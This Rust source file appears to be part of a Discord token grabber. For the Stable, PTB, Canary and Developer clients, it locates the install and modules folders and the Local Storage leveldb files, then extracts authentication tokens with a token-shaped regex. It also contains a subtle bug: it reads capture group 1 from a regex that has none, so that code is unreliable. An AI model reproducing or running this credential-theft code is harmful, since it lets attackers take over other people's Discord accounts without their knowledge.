use std::io::Read;

use regex::Regex;

pub trait Discord {
    fn new() -> Self;

    fn get_absolute_path(&self) -> String;
    fn get_modules_path(&self) -> String;
    fn get_token_leveldb_path(&self) -> String;

    fn get_token(&self) -> String;
}


pub struct DiscordStable {}

pub struct DiscordPTB {}

pub struct DiscordCanary {}

pub struct DiscordDeveloper {}

impl Discord for DiscordStable {
    fn new() -> Self {
        DiscordStable {}
    }

    fn get_absolute_path(&self) -> String {
        let localappdata = std::env::var("LOCALAPPDATA").unwrap();
        let mut path = String::from(localappdata);
        path.push_str("\\Discord\\");
        path
    }

    fn get_modules_path(&self) -> String {
        let mut path = self.get_absolute_path();
        path.push_str("modules\\");
        path
    }

    fn get_token_leveldb_path(&self) -> String {
        let appdata = std::env::var("APPDATA").unwrap();
        let mut path = String::from(appdata);
        path.push_str("\\discord\\Local Storage\\leveldb\\");
        path
    }

    fn get_token(&self) -> String {
        let leveldb_path = self.get_token_leveldb_path();
        let dir = std::fs::read_dir(leveldb_path).unwrap();

        for entry in dir {
            let entry = entry.unwrap();
            let path = entry.path();
            let filename = path.file_name().unwrap().to_str().unwrap();
            if filename.ends_with(".ldb") {
                let re = Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}").unwrap();
                
                let file = std::fs::File::open(path).unwrap();
                let mut buf_reader = std::io::BufReader::new(file);
                let mut contents = String::new();
                buf_reader.read_to_string(&mut contents).unwrap();

                let caps = re.captures(&contents).unwrap();

                return caps.get(1).unwrap().as_str().to_string();
            }
        }

        String::from("")
    }
}

impl Discord for DiscordPTB {
    fn new() -> Self {
        DiscordPTB {}
    }

    fn get_absolute_path(&self) -> String {
        let localappdata = std::env::var("LOCALAPPDATA").unwrap();
        let mut path = String::from(localappdata);
        path.push_str("\\DiscordPTB\\");
        path
    }

    fn get_modules_path(&self) -> String {
        let mut path = self.get_absolute_path();
        path.push_str("modules\\");
        path
    }

    fn get_token_leveldb_path(&self) -> String {
        let appdata = std::env::var("APPDATA").unwrap();
        let mut path = String::from(appdata);
        path.push_str("\\discordptb\\Local Storage\\leveldb\\");
        path
    }

    fn get_token(&self) -> String {
        let leveldb_path = self.get_token_leveldb_path();
        let dir = std::fs::read_dir(leveldb_path).unwrap();

        for entry in dir {
            let entry = entry.unwrap();
            let path = entry.path();
            let filename = path.file_name().unwrap().to_str().unwrap();
            if filename.ends_with(".ldb") {
                let re = Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}").unwrap();
                
                let file = std::fs::File::open(path).unwrap();
                let mut buf_reader = std::io::BufReader::new(file);
                let mut contents = String::new();
                buf_reader.read_to_string(&mut contents).unwrap();

                let caps = re.captures(&contents).unwrap();

                return caps.get(1).unwrap().as_str().to_string();
            }
        }

        String::from("")
    }
}

impl Discord for DiscordCanary {
    fn new() -> Self {
        DiscordCanary {}
    }

    fn get_absolute_path(&self) -> String {
        let localappdata = std::env::var("LOCALAPPDATA").unwrap();
        let mut path = String::from(localappdata);
        path.push_str("\\DiscordCanary\\");
        path
    }

    fn get_modules_path(&self) -> String {
        let mut path = self.get_absolute_path();
        path.push_str("modules\\");
        path
    }

    fn get_token_leveldb_path(&self) -> String {
        let appdata = std::env::var("APPDATA").unwrap();
        let mut path = String::from(appdata);
        path.push_str("\\discordcanary\\Local Storage\\leveldb\\");
        path
    }

    fn get_token(&self) -> String {
        let leveldb_path = self.get_token_leveldb_path();
        let dir = std::fs::read_dir(leveldb_path).unwrap();

        for entry in dir {
            let entry = entry.unwrap();
            let path = entry.path();
            let filename = path.file_name().unwrap().to_str().unwrap();
            if filename.ends_with(".ldb") {
                let re = Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}").unwrap();
                
                // read the file
                let file = std::fs::File::open(path).unwrap();
                let mut buf_reader = std::io::BufReader::new(file);
                let mut contents = String::new();
                buf_reader.read_to_string(&mut contents).unwrap();

                let caps = re.captures(&contents).unwrap();

                return caps.get(1).unwrap().as_str().to_string();
            }
        }

        String::from("")
    }
}

impl Discord for DiscordDeveloper {
    fn new() -> Self {
        DiscordDeveloper {}
    }

    fn get_absolute_path(&self) -> String {
        let localappdata = std::env::var("LOCALAPPDATA").unwrap();
        let mut path = String::from(localappdata);
        path.push_str("\\DiscordDeveloper\\");
        path
    }

    fn get_modules_path(&self) -> String {
        let mut path = self.get_absolute_path();
        path.push_str("modules\\");
        path
    }

    fn get_token_leveldb_path(&self) -> String {
        let appdata = std::env::var("APPDATA").unwrap();
        let mut path = String::from(appdata);
        path.push_str("\\discorddeveloper\\Local Storage\\leveldb\\");
        path
    }

    fn get_token(&self) -> String {
        let leveldb_path = self.get_token_leveldb_path();
        let dir = std::fs::read_dir(leveldb_path).unwrap();

        for entry in dir {
            let entry = entry.unwrap();
            let path = entry.path();
            let filename = path.file_name().unwrap().to_str().unwrap();
            if filename.ends_with(".ldb") {
                let re = Regex::new(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}").unwrap();
                
                let file = std::fs::File::open(path).unwrap();
                let mut buf_reader = std::io::BufReader::new(file);
                let mut contents = String::new();
                buf_reader.read_to_string(&mut contents).unwrap();

                let caps = re.captures(&contents).unwrap();

                return caps.get(1).unwrap().as_str().to_string();
            }
        }

        String::from("")
    }
}